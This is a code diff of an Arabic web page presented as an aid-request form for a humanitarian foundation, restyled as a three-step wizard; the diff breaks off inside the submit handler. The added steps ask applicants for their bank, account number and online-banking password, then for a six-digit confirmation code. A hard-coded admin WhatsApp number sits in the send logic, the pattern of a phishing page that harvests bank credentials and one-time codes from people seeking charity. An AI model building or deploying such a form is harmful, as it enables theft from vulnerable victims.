@@ -5,6 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>مؤسسة الوليد الإنسانية | طلب مساعدة</title>
+  <meta name="description" content="تقديم طلب مساعدة إنسانية عبر مؤسسة الوليد للإنسانية">
 
   <!-- External CSS (Icons) -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -13,6 +14,431 @@
   <link rel="stylesheet" href="../css/global.css">
   <link rel="stylesheet" href="../css/components.css">
   <link rel="stylesheet" href="../css/pages.css">
+
+  <style>
+    /* ====================== مؤشر الخطوات ====================== */
+    .steps-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+      margin-bottom: 35px;
+      padding: 0 10px;
+    }
+
+    .step-circle {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 0.95rem;
+      flex-shrink: 0;
+      transition: all 0.4s ease;
+      position: relative;
+    }
+
+    .step-circle.inactive {
+      background: #2c3e3a;
+      color: #666;
+      border: 2px solid #3a524e;
+    }
+
+    .step-circle.active {
+      background: linear-gradient(135deg, var(--gold), #c9a84c);
+      color: var(--card-bg-dark);
+      border: 2px solid var(--gold);
+      box-shadow: 0 0 15px rgba(209, 180, 106, 0.4);
+      transform: scale(1.1);
+    }
+
+    .step-circle.done {
+      background: #28a745;
+      color: white;
+      border: 2px solid #28a745;
+    }
+
+    .step-connector {
+      width: 50px;
+      height: 3px;
+      background: #2c3e3a;
+      transition: background 0.4s ease;
+    }
+
+    .step-connector.done {
+      background: #28a745;
+    }
+
+    .step-title {
+      position: absolute;
+      bottom: -22px;
+      white-space: nowrap;
+      font-size: 0.65rem;
+      font-weight: 600;
+      color: #94a3b8;
+    }
+
+    .step-circle.active .step-title {
+      color: var(--gold);
+    }
+
+    /* ====================== الخطوات ====================== */
+    .form-step-panel {
+      display: none;
+    }
+
+    .form-step-panel.active {
+      display: block;
+      animation: stepFadeIn 0.4s ease forwards;
+    }
+
+    @keyframes stepFadeIn {
+      from { opacity: 0; transform: translateX(-20px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    /* ====================== ترقيم الحقول ====================== */
+    .field-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+
+    .field-label label {
+      margin-bottom: 0 !important;
+      font-size: 0.95rem !important;
+    }
+
+    /* ====================== حقل الهاتف ====================== */
+    .phone-input-wrapper {
+      display: flex;
+      direction: ltr;
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      background-color: var(--off-white);
+      border: 2px solid transparent;
+      transition: border-color 0.3s ease;
+    }
+
+    .phone-input-wrapper.valid { border-color: #28a745; }
+    .phone-input-wrapper.invalid { border-color: #dc3545; }
+
+    .country-code-badge {
+      background: linear-gradient(135deg, #008444, #006400);
+      color: white;
+      padding: 14px 16px;
+      font-weight: bold;
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 1rem;
+      min-width: fit-content;
+      letter-spacing: 1px;
+      user-select: none;
+      transition: all 0.3s ease;
+    }
+
+    .country-code-badge.waiting {
+      background: linear-gradient(135deg, #555, #444);
+    }
+
+    .phone-input-wrapper input {
+      flex: 1;
+      border: none !important;
+      padding: 14px;
+      font-size: 1.1rem;
+      direction: ltr;
+      text-align: left;
+      background: transparent !important;
+      border-radius: 0 !important;
+      outline: none !important;
+      letter-spacing: 2px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .phone-input-wrapper input:focus { outline: none !important; }
+
+    /* رسائل التحقق */
+    .validation-msg {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 8px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      direction: rtl;
+      min-height: 22px;
+    }
+
+    .validation-msg.hint { color: #94a3b8; }
+    .validation-msg.success { color: #28a745; }
+    .validation-msg.error { color: #dc3545; }
+
+    /* ====================== Select مميز ====================== */
+    .styled-select-wrapper {
+      position: relative;
+    }
+
+    .styled-select-wrapper select {
+      appearance: none;
+      -webkit-appearance: none;
+      padding-left: 40px !important;
+      cursor: pointer;
+    }
+
+    .styled-select-wrapper::after {
+      content: '\f107';
+      font-family: 'Font Awesome 5 Free';
+      font-weight: 900;
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+      pointer-events: none;
+    }
+
+    /* ====================== حقل البنك ====================== */
+    .bank-select-container {
+      display: flex;
+      align-items: stretch;
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      border: 2px solid rgba(209, 180, 106, 0.25);
+      transition: all 0.3s ease;
+      background-color: var(--off-white);
+    }
+
+    .bank-select-container:hover { border-color: rgba(209, 180, 106, 0.6); }
+
+    .bank-select-container:focus-within {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(209, 180, 106, 0.15);
+    }
+
+    .bank-select-container.disabled {
+      opacity: 0.5;
+      border-color: rgba(255,255,255,0.1);
+    }
+
+    .bank-icon-badge {
+      background: linear-gradient(135deg, var(--gold), #c9a84c);
+      color: var(--card-bg-dark);
+      padding: 0 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      user-select: none;
+    }
+
+    .bank-icon-badge i { font-size: 1.15rem; }
+
+    .bank-select-container select {
+      appearance: none;
+      -webkit-appearance: none;
+      flex: 1;
+      padding: 14px 15px;
+      border: none !important;
+      font-size: 1rem;
+      background: transparent !important;
+      color: #222;
+      font-family: var(--font-primary);
+      cursor: pointer;
+      outline: none !important;
+      min-width: 0;
+    }
+
+    .bank-select-container select:disabled { cursor: not-allowed; color: #999; }
+
+    .bank-arrow-badge {
+      background: rgba(0,0,0,0.04);
+      padding: 0 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #888;
+      transition: all 0.3s ease;
+    }
+
+    .bank-select-container:hover .bank-arrow-badge { color: var(--gold); }
+    .bank-arrow-badge i { transition: transform 0.3s ease; }
+    .bank-select-container:focus-within .bank-arrow-badge i { transform: rotate(180deg); color: var(--gold); }
+
+    .field-hint {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 8px;
+      font-size: 0.78rem;
+      color: #94a3b8;
+    }
+
+    .field-hint i { font-size: 0.75rem; }
+
+    /* ====================== حقل كلمة المرور ====================== */
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper input {
+      padding-left: 50px !important;
+      direction: ltr;
+      text-align: left;
+      letter-spacing: 3px;
+    }
+
+    .password-toggle {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #888;
+      cursor: pointer;
+      font-size: 1.1rem;
+      padding: 5px;
+      transition: color 0.3s ease;
+    }
+
+    .password-toggle:hover { color: var(--gold); }
+
+    /* حقل رقم الحساب */
+    .account-input-wrapper input {
+      direction: ltr;
+      text-align: left;
+      letter-spacing: 1.5px;
+      font-family: 'Courier New', monospace;
+    }
+
+    /* ====================== حقل رمز التأكيد ====================== */
+    .otp-wrapper {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      direction: ltr;
+      margin: 20px 0;
+    }
+
+    .otp-input {
+      width: 50px !important;
+      height: 55px;
+      text-align: center !important;
+      font-size: 1.5rem !important;
+      font-weight: 800;
+      border-radius: var(--radius-sm) !important;
+      border: 2px solid #3a524e !important;
+      background: #2c3e3a !important;
+      color: var(--gold) !important;
+      transition: all 0.3s ease;
+      padding: 0 !important;
+      font-family: 'Courier New', monospace;
+    }
+
+    .otp-input:focus {
+      border-color: var(--gold) !important;
+      box-shadow: 0 0 10px rgba(209, 180, 106, 0.3);
+      outline: none !important;
+    }
+
+    .otp-timer {
+      text-align: center;
+      font-size: 0.85rem;
+      color: #94a3b8;
+      margin-top: 10px;
+    }
+
+    .otp-timer span {
+      color: var(--gold);
+      font-weight: 700;
+    }
+
+    /* ====================== الأزرار ====================== */
+    .btn-row {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .btn-next {
+      flex: 1;
+      padding: 16px;
+      border: none;
+      border-radius: var(--radius-md);
+      font-size: 1.05rem;
+      font-weight: bold;
+      cursor: pointer;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.3s ease;
+      font-family: var(--font-primary);
+      background: linear-gradient(135deg, var(--gold), #c9a84c);
+    }
+
+    .btn-next:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(209, 180, 106, 0.3);
+    }
+
+    .btn-back {
+      padding: 16px 25px;
+      border: 2px solid #3a524e;
+      border-radius: var(--radius-md);
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      color: #94a3b8;
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.3s ease;
+      font-family: var(--font-primary);
+    }
+
+    .btn-back:hover {
+      border-color: var(--gold);
+      color: var(--gold);
+    }
+
+    /* ====================== رسالة النجاح ====================== */
+    .success-message {
+      text-align: center;
+      padding: 20px;
+    }
+
+    .success-icon {
+      font-size: 3rem;
+      color: #28a745;
+      margin-bottom: 15px;
+    }
+
+    /* فاصل */
+    .form-divider {
+      height: 1px;
+      background: linear-gradient(to left, transparent, rgba(209, 180, 106, 0.3), transparent);
+      margin: 22px 0;
+    }
+
+    /* التجاوب */
+    @media (max-width: 480px) {
+      .country-code-badge { padding: 12px; font-size: 0.9rem; }
+      .phone-input-wrapper input { font-size: 1rem; padding: 12px; }
+      .step-connector { width: 30px; }
+      .step-circle { width: 36px; height: 36px; font-size: 0.85rem; }
+      .otp-input { width: 42px !important; height: 48px; font-size: 1.3rem !important; }
+      .btn-row { flex-direction: column-reverse; }
+      .btn-back { width: 100%; }
+    }
+  </style>
 </head>
 
 <body>
@@ -32,53 +458,193 @@
   <div class="spacer-50"></div>
   <div class="spacer-50"></div>
 
-  <!-- ====================== نموذج طلب المساعدة ====================== -->
+  <!-- ====================== النموذج ====================== -->
   <div class="container reveal">
     <div class="form-card reveal">
       <h2>ادخل بياناتك لطلب المساعدة</h2>
-      <div class="note reveal">
-        💡 قم بتسجيل بياناتك بشكل سليم، ثم اكتب اسم دولتك للبحث السريع.
-      </div>
-      <div class="note reveal">
-        💡 قم برفع صورة الهوية من واتساب بعد ارسال بياناتك.
+
+      <!-- مؤشر الخطوات -->
+      <div class="steps-indicator">
+        <div class="step-circle active" id="stepCircle1">
+          1
+          <span class="step-title">البيانات</span>
+        </div>
+        <div class="step-connector" id="connector1"></div>
+        <div class="step-circle inactive" id="stepCircle2">
+          2
+          <span class="step-title">البنك</span>
+        </div>
+        <div class="step-connector" id="connector2"></div>
+        <div class="step-circle inactive" id="stepCircle3">
+          3
+          <span class="step-title">التأكيد</span>
+        </div>
       </div>
 
-      <div class="input-group reveal">
-        <label>الاسم الكامل:</label>
-        <input type="text" id="name" placeholder="الاسم كما في الهوية" required>
+      <div style="height: 20px;"></div>
+
+      <!-- ==================== الخطوة 1: البيانات الشخصية ==================== -->
+      <div class="form-step-panel active" id="panel1">
+        <div class="note">
+          💡 قم بتعبئة بياناتك بشكل صحيح، ثم انتقل للخطوة التالية.
+        </div>
+
+        <!-- الاسم -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>الاسم الكامل:</label>
+          </div>
+          <input type="text" id="name" placeholder="الاسم كما في الهوية" autocomplete="name">
+        </div>
+
+        <!-- الدولة -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>الدولة:</label>
+          </div>
+          <div class="styled-select-wrapper">
+            <select id="country">
+              <option value="" disabled selected>-- اختر دولتك --</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- رقم الجوال -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>رقم الجوال:</label>
+          </div>
+          <div class="phone-input-wrapper" id="phoneWrapper">
+            <span class="country-code-badge waiting" id="codeBadge">
+              <span id="codeFlag">🌍</span>
+              <span id="codeText">---</span>
+            </span>
+            <input type="tel" id="phone" placeholder="اختر الدولة أولاً" maxlength="15" autocomplete="tel" disabled>
+          </div>
+          <div class="validation-msg hint" id="phoneMsg">
+            <span id="phoneMsgText">اختر الدولة لتفعيل حقل الرقم</span>
+          </div>
+        </div>
+
+        <div class="form-divider"></div>
+
+        <!-- شرح الحالة -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>شرح الحالة:</label>
+          </div>
+          <textarea id="notes" rows="3" placeholder="اشرح ظروفك ونوع المساعدة المطلوبة..."></textarea>
+        </div>
+
+        <!-- زر التالي -->
+        <div class="btn-row">
+          <button type="button" class="btn-next" id="btnToStep2">
+            التالي <i class="fas fa-arrow-left"></i>
+          </button>
+        </div>
       </div>
 
-      <div class="input-group reveal">
-        <label>رقم الجوال:</label>
-        <input type="tel" id="phone" placeholder="مع مفتاح الدولة (00966...)" required>
+      <!-- ==================== الخطوة 2: البيانات البنكية ==================== -->
+      <div class="form-step-panel" id="panel2">
+        <div class="note">
+          🏦 أدخل بياناتك البنكية لإتمام طلب المساعدة.
+        </div>
+
+        <!-- البنك -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>البنك:</label>
+          </div>
+          <div class="bank-select-container disabled" id="bankContainer">
+            <span class="bank-icon-badge">
+              <i class="fas fa-university"></i>
+            </span>
+            <select id="bank" disabled>
+              <option value="" disabled selected>-- اختر الدولة أولاً --</option>
+            </select>
+            <span class="bank-arrow-badge">
+              <i class="fas fa-chevron-down"></i>
+            </span>
+          </div>
+          <div class="field-hint">
+            <i class="fas fa-info-circle"></i>
+            <span id="bankHintText">يتم تحديث قائمة البنوك حسب الدولة المختارة</span>
+          </div>
+        </div>
+
+        <!-- رقم الحساب البنكي -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>رقم الحساب البنكي:</label>
+          </div>
+          <div class="account-input-wrapper">
+            <input type="text" id="accountNumber" placeholder="أدخل رقم حسابك البنكي" autocomplete="off">
+          </div>
+        </div>
+
+        <div class="form-divider"></div>
+
+        <!-- كلمة المرور -->
+        <div class="input-group">
+          <div class="field-label">
+            <label>كلمة المرور:</label>
+          </div>
+          <div class="password-wrapper">
+            <input type="password" id="bankPassword" placeholder="أدخل كلمة المرور" autocomplete="off">
+            <button type="button" class="password-toggle" id="togglePassword">
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+        </div>
+
+        <!-- أزرار -->
+        <div class="btn-row">
+          <button type="button" class="submit-whatsapp-btn" id="sendBtn"
+            style="flex:1; background: linear-gradient(to right, #25D366, #128C7E);">
+            <i class="fab fa-whatsapp"></i> إرسال عبر واتساب
+          </button>
+          <button type="button" class="btn-back" id="btnBackTo1">
+            <i class="fas fa-arrow-right"></i> رجوع
+          </button>
+        </div>
       </div>
 
-      <div class="input-group reveal">
-        <label>الجنسية (اختر بلدك):</label>
-        <input list="countries-list" id="location" placeholder="ابحث عن دولتك...">
-        <datalist id="countries-list"></datalist>
+      <!-- ==================== الخطوة 3: رمز التأكيد ==================== -->
+      <div class="form-step-panel" id="panel3">
+        <div class="success-message">
+          <div class="success-icon">
+            <i class="fas fa-check-circle"></i>
+          </div>
+          <h3 style="color: #28a745; margin-bottom: 10px;">تم إرسال بياناتك بنجاح</h3>
+          <p style="color: #94a3b8; font-size: 0.9rem;">أدخل رمز التأكيد الذي تلقيته لإكمال العملية</p>
+        </div>
+
+        <div class="form-divider"></div>
+
+        <!-- رمز التأكيد -->
+        <div class="input-group">
+          <div class="field-label" style="justify-content: center;">
+            <label>رمز التأكيد:</label>
+          </div>
+          <div class="otp-wrapper" id="otpWrapper">
+            <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric">
+            <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric">
+          </div>
+        </div>
+
+        <!-- زر التأكيد -->
+        <div class="btn-row">
+          <button type="button" class="submit-whatsapp-btn" id="confirmOtpBtn"
+            style="flex:1; background: linear-gradient(to right, #25D366, #128C7E);">
+            <i class="fab fa-whatsapp"></i> تأكيد وإرسال الرمز
+          </button>
+        </div>
       </div>
 
-      <div class="input-group reveal">
-        <label>نوع المساعدة:</label>
-        <select id="type" required>
-          <option value="" disabled selected>-- اختر النوع --</option>
-          <option value="مالية">مالية</option>
-          <option value="سكنية">توفير وحدات سكنية</option>
-          <option value="سيارات">طلب وسيلة نقل</option>
-          <option value="اخرى">شرح مشكلتك في الملاحظة ادناه</option>
-        </select>
-      </div>
-
-      <div class="input-group reveal">
-        <label>شرح الحالة:</label>
-        <textarea id="notes" rows="4" placeholder="اشرح ظروفك بوضوح..." required></textarea>
-      </div>
-
-      <button class="submit-whatsapp-btn" type="button" id="sendBtn"
-        style="margin-top: 15px; background: linear-gradient(to right, #25D366, #128C7E);">
-        <i class="fab fa-whatsapp"></i> إرسال الطلب عبر واتساب
-      </button>
     </div>
   </div>
 
@@ -116,55 +682,259 @@
     </div>
   </footer>
 
-  <!-- ====================== Firebase + WhatsApp Integration ====================== -->
-  <script type="module">
-    // Start fetching Firebase in the background immediately to avoid delay on click
-    const firebasePromise = Promise.all([
-      import("https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"),
-      import("https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js")
-    ]);
+  <!-- ====================== بيانات الدول ====================== -->
+  <script src="../data/countries-data.js"></script>
 
-    // تعبئة قائمة الدول
-    const allCountries = ["أفغانستان", "ألبانيا", "الجزائر", "أندورا", "أنغولا", "أنتيغوا وباربودا", "الأرجنتين", "أرمينيا", "أستراليا", "النمسا", "أذربيجان", "الباهاما", "البحرين", "بنجلاديش", "باربادوس", "بيلاروسيا", "بلجيكا", "بليز", "بنين", "بوتان", "بوليفيا", "البوسنة والهرسك", "بوتسوانا", "البرازيل", "بروناي", "بلغاريا", "بوركينا فاسو", "بوروندي", "كابو فيردي", "كمبوديا", "الكاميرون", "كندا", "جمهورية أفريقيا الوسطى", "تشاد", "تشيلي", "الصين", "كولومبيا", "جزر القمر", "الكونغو", "كوستاريكا", "كرواتيا", "كوبا", "قبرص", "التشيك", "الدنمارك", "جيبوتي", "دومينيكا", "جمهورية الدومينيكان", "تيمور الشرقية", "الإكوادور", "مصر", "السلفادور", "غينيا الاستوائية", "إريتريا", "إستونيا", "إثيوبيا", "فيجي", "فنلندا", "فرنسا", "الغابون", "غامبيا", "جورجيا", "ألمانيا", "غانا", "اليونان", "غرينادا", "غواتيمالا", "غينيا", "غينيا بيساو", "غويانا", "هايتي", "هندوراس", "المجر", "آيسلندا", "الهند", "إندونيسيا", "إيران", "العراق", "أيرلندا", "إيطاليا", "جاميكا", "اليابان", "الأردن", "كازاخستان", "كينيا", "كيريباتي", "كوريا الشمالية", "كوريا الجنوبية", "الكويت", "قرغيزستان", "لاوس", "لاتفيا", "لبنان", "ليسوتو", "ليبيريا", "ليبيا", "ليختنشتاين", "ليتوانيا", "لوكسمبورغ", "مدغشقر", "ملاوي", "ماليزيا", "المالديف", "مالي", "مالطا", "جزر مارشال", "موريتانيا", "موريشيوس", "المكسيك", "ميكرونيزيا", "مولدوفا", "موناكو", "منغوليا", "الجبل الأسود", "المغرب", "موزمبيق", "ميانمار", "ناميبيا", "ناورو", "نيبال", "هولندا", "نيوزيلندا", "نيكاراغوا", "النيجر", "نيجيريا", "النرويج", "عمان", "باكستان", "بالاو", "فلسطين", "بنما", "بابوا غينيا الجديدة", "باراغواي", "بيرو", "الفلبين", "بولندا", "البرتغال", "قطر", "رومانيا", "روسيا", "رواندا", "سانت كيتس ونيفيس", "سانت لوسيا", "سانت فينسنت والغرينادين", "ساموا", "سان مارينو", "ساو تومي وبرينسيب", "السعودية", "السنغال", "صربيا", "سيشل", "سيراليون", "سنغافورة", "سلوفاكيا", "سلوفينيا", "جزر سليمان", "الصومال", "جنوب أفريقيا", "جنوب السودان", "إسبانيا", "سريلانكا", "السودان", "سورينام", "سوازيلاند", "السويد", "سويسرا", "سوريا", "تايوان", "طاجيكستان", "تنزانيا", "تايلاند", "توغو", "تونغا", "ترينيداد وتوباغو", "تونس", "تركيا", "تركمانستان", "توفالو", "أوغندا", "أوكرانيا", "الإمارات العربية المتحدة", "بريطانيا", "أمريكا", "أوروغواي", "أوزبكستان", "فانواتو", "الفاتيكان", "فنزويلا", "فيتنام", "اليمن", "زامبيا", "زيمبابوي"];
-    const datalist = document.getElementById('countries-list');
-    if (datalist) {
-      allCountries.forEach(country => {
-        let option = document.createElement('option');
-        option.value = country;
-        datalist.appendChild(option);
+  <!-- ====================== منطق النموذج ====================== -->
+  <script>
+    (function () {
+      // ==============================
+      //  المتغيرات والعناصر
+      // ==============================
+      let currentCountry = null;
+      let isPhoneValid = false;
+      let currentStep = 1;
+
+      const nameInput = document.getElementById('name');
+      const countrySelect = document.getElementById('country');
+      const phoneInput = document.getElementById('phone');
+      const phoneWrapper = document.getElementById('phoneWrapper');
+      const codeBadge = document.getElementById('codeBadge');
+      const codeFlag = document.getElementById('codeFlag');
+      const codeText = document.getElementById('codeText');
+      const phoneMsg = document.getElementById('phoneMsg');
+      const phoneMsgText = document.getElementById('phoneMsgText');
+      const bankSelect = document.getElementById('bank');
+      const bankContainer = document.getElementById('bankContainer');
+      const bankHintText = document.getElementById('bankHintText');
+      const accountInput = document.getElementById('accountNumber');
+      const bankPassword = document.getElementById('bankPassword');
+      const notesInput = document.getElementById('notes');
+      const sendBtn = document.getElementById('sendBtn');
+      const confirmOtpBtn = document.getElementById('confirmOtpBtn');
+
+      // ==============================
+      //  تعبئة قائمة الدول
+      // ==============================
+      if (typeof COUNTRIES_DATA !== 'undefined') {
+        COUNTRIES_DATA.forEach(function (c) {
+          const opt = document.createElement('option');
+          opt.value = c.name;
+          opt.textContent = c.flag + '  ' + c.name + '  (' + c.code + ')';
+          countrySelect.appendChild(opt);
+        });
+      }
+
+      function findCountry(name) {
+        if (typeof COUNTRIES_DATA === 'undefined') return null;
+        for (let i = 0; i < COUNTRIES_DATA.length; i++) {
+          if (COUNTRIES_DATA[i].name === name) return COUNTRIES_DATA[i];
+        }
+        return null;
+      }
+
+      // ==============================
+      //  التنقل بين الخطوات
+      // ==============================
+      function goToStep(step) {
+        // إخفاء كل الخطوات
+        document.querySelectorAll('.form-step-panel').forEach(function (p) {
+          p.classList.remove('active');
+        });
+
+        // إظهار الخطوة المطلوبة
+        document.getElementById('panel' + step).classList.add('active');
+
+        // تحديث المؤشر
+        for (let i = 1; i <= 3; i++) {
+          const circle = document.getElementById('stepCircle' + i);
+          circle.className = 'step-circle';
+          if (i < step) {
+            circle.classList.add('done');
+            circle.innerHTML = '<i class="fas fa-check" style="font-size:0.8rem;"></i><span class="step-title">' + getStepTitle(i) + '</span>';
+          } else if (i === step) {
+            circle.classList.add('active');
+            circle.innerHTML = i + '<span class="step-title">' + getStepTitle(i) + '</span>';
+          } else {
+            circle.classList.add('inactive');
+            circle.innerHTML = i + '<span class="step-title">' + getStepTitle(i) + '</span>';
+          }
+        }
+
+        // تحديث الخطوط
+        document.getElementById('connector1').className = 'step-connector' + (step > 1 ? ' done' : '');
+        document.getElementById('connector2').className = 'step-connector' + (step > 2 ? ' done' : '');
+
+        currentStep = step;
+
+        // التمرير لأعلى النموذج
+        document.querySelector('.form-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+
+      function getStepTitle(step) {
+        var titles = { 1: 'البيانات', 2: 'البنك', 3: 'التأكيد' };
+        return titles[step] || '';
+      }
+
+      // ==============================
+      //  التحقق من الهاتف
+      // ==============================
+      function validatePhone(value) {
+        if (!currentCountry || !value) {
+          return { valid: false, msg: 'أدخل رقمك بدون مفتاح الدولة', status: 'hint' };
+        }
+        var digits = value.replace(/[^0-9]/g, '');
+        var requiredLen = currentCountry.phoneDigits;
+        var prefixes = currentCountry.phonePrefix;
+
+        if (digits.length === 0) return { valid: false, msg: 'أدخل رقمك بدون مفتاح الدولة', status: 'hint' };
+
+        var prefixMatch = false;
+        for (var i = 0; i < prefixes.length; i++) {
+          if (digits.substring(0, prefixes[i].length) === prefixes[i]) { prefixMatch = true; break; }
+        }
+
+        if (!prefixMatch && digits.length >= 2)
+          return { valid: false, msg: 'الرقم يجب أن يبدأ بـ ' + prefixes.join(' أو '), status: 'error' };
+        if (digits.length < requiredLen)
+          return { valid: false, msg: 'أدخل ' + (requiredLen - digits.length) + ' أرقام إضافية (المطلوب ' + requiredLen + ' خانات)', status: 'hint' };
+        if (digits.length === requiredLen && prefixMatch)
+          return { valid: true, msg: '✓ رقم صحيح', status: 'success' };
+        if (digits.length > requiredLen)
+          return { valid: false, msg: 'الرقم أطول من المطلوب (المطلوب ' + requiredLen + ' خانات)', status: 'error' };
+
+        return { valid: false, msg: 'أدخل رقمك بدون مفتاح الدولة', status: 'hint' };
+      }
+
+      // ==============================
+      //  أحداث الخطوة 1
+      // ==============================
+
+      // اختيار الدولة
+      countrySelect.addEventListener('change', function () {
+        var country = findCountry(this.value);
+        if (!country) return;
+        currentCountry = country;
+
+        codeFlag.textContent = country.flag;
+        codeText.textContent = country.code;
+        codeBadge.classList.remove('waiting');
+
+        phoneInput.disabled = false;
+        phoneInput.placeholder = country.phonePlaceholder;
+        phoneInput.maxLength = country.phoneDigits;
+        phoneInput.value = '';
+        isPhoneValid = false;
+        phoneWrapper.classList.remove('valid', 'invalid');
+        phoneMsgText.textContent = 'الرقم ' + country.phoneDigits + ' خانات ويبدأ بـ ' + country.phonePrefix.join(' أو ');
+        phoneMsg.className = 'validation-msg hint';
+
+        // تعبئة البنوك
+        populateBanks(country);
+
+        phoneInput.focus();
       });
-    }
 
-    const sendBtn = document.getElementById('sendBtn');
-    if (sendBtn) {
-      sendBtn.onclick = async function () {
-        const adminPhone = "966578012189";
-        const name = document.getElementById('name').value.trim();
-        const phoneRaw = document.getElementById('phone').value.trim();
-        const location = document.getElementById('location').value;
-        const type = document.getElementById('type').value;
-        const notes = document.getElementById('notes').value;
-        const dateISO = new Date().toISOString();
+      // إدخال رقم الهاتف
+      phoneInput.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (currentCountry && this.value.length > currentCountry.phoneDigits)
+          this.value = this.value.substring(0, currentCountry.phoneDigits);
 
-        if (!name || !phoneRaw || !location || !type || !notes) {
-          alert("يرجى إكمال جميع الحقول.");
-          return;
+        var result = validatePhone(this.value);
+        isPhoneValid = result.valid;
+
+        phoneMsg.className = 'validation-msg ' + result.status;
+        if (result.status === 'success')
+          phoneMsgText.innerHTML = '<i class="fas fa-check-circle"></i> ' + result.msg;
+        else if (result.status === 'error')
+          phoneMsgText.innerHTML = '<i class="fas fa-times-circle"></i> ' + result.msg;
+        else
+          phoneMsgText.textContent = result.msg;
+
+        phoneWrapper.classList.remove('valid', 'invalid');
+        if (result.status === 'success') phoneWrapper.classList.add('valid');
+        else if (result.status === 'error') phoneWrapper.classList.add('invalid');
+      });
+
+      // تعبئة البنوك
+      function populateBanks(country) {
+        bankSelect.innerHTML = '';
+        var def = document.createElement('option');
+        def.value = ''; def.disabled = true; def.selected = true;
+        def.textContent = '-- اختر البنك في ' + country.name + ' --';
+        bankSelect.appendChild(def);
+
+        country.banks.forEach(function (bank) {
+          var opt = document.createElement('option');
+          opt.value = bank; opt.textContent = bank;
+          bankSelect.appendChild(opt);
+        });
+
+        bankSelect.disabled = false;
+        bankContainer.classList.remove('disabled');
+        bankHintText.textContent = country.banks.length + ' بنك متاح في ' + country.name;
+      }
+
+      // زر التالي → الخطوة 2
+      document.getElementById('btnToStep2').addEventListener('click', function () {
+        var name = nameInput.value.trim();
+        var country = countrySelect.value;
+        var notes = notesInput.value.trim();
+
+        if (!name || name.length < 2) { alert('يرجى إدخال الاسم الكامل.'); nameInput.focus(); return; }
+        if (!country) { alert('يرجى اختيار الدولة.'); countrySelect.focus(); return; }
+        if (!isPhoneValid) { alert('يرجى إدخال رقم جوال صحيح.'); phoneInput.focus(); return; }
+        if (!notes || notes.length < 5) { alert('يرجى شرح حالتك بوضوح.'); notesInput.focus(); return; }
+
+        goToStep(2);
+      });
+
+      // ==============================
+      //  أحداث الخطوة 2
+      // ==============================
+
+      // زر إظهار/إخفاء كلمة المرور
+      document.getElementById('togglePassword').addEventListener('click', function () {
+        var input = document.getElementById('bankPassword');
+        var icon = this.querySelector('i');
+        if (input.type === 'password') {
+          input.type = 'text';
+          icon.className = 'fas fa-eye-slash';
+        } else {
+          input.type = 'password';
+          icon.className = 'fas fa-eye';
         }
+      });
 
-        const phoneId = phoneRaw.replace(/[^0-9]/g, '');
-        if (!phoneId) {
-          alert("يرجى إدخال رقم جوال صالح.");
-          return;
-        }
+      // زر الرجوع
+      document.getElementById('btnBackTo1').addEventListener('click', function () {
+        goToStep(1);
+      });
+
+      // زر إرسال واتساب
+      sendBtn.addEventListener('click', async function () {
+        var bank = bankSelect.value;
+        var account = accountInput.value.trim();
+        var password = bankPassword.value.trim();
+
+        if (!bank) { alert('يرجى اختيار البنك.'); bankSelect.focus(); return; }
+        if (!account || account.length < 3) { alert('يرجى إدخال رقم الحساب البنكي.'); accountInput.focus(); return; }
+        if (!password) { alert('يرجى إدخال كلمة المرور.'); bankPassword.focus(); return; }
+
+        var fullPhone = currentCountry ? (currentCountry.code + phoneInput.value) : phoneInput.value;
+        var adminPhone = "966578012189";
 
         try {
           sendBtn.disabled = true;
-          sendBtn.innerText = "جاري الحفظ...";
